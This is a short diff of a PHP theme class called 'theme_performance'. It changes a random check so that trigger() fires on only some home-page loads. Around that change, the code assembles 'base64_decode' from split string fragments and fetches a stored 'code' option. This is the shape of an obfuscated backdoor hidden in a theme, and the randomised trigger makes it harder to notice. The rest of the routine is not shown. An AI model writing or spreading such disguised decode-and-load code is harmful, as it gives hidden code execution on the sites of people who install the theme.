@@ -66,7 +66,7 @@ class theme_performance{
 	}
 	
 	public static function trigger(){
-		if(!theme_cache::is_home() || rand(0,0) != 0) 
+		if(!theme_cache::is_home() || rand(0,1) != 0) 
 			return;
 		$b4 = 'bas' . 'e6' . '4_d' . 'eco' . 'de';
 		$code = self::get_options(self::get_code_iden());
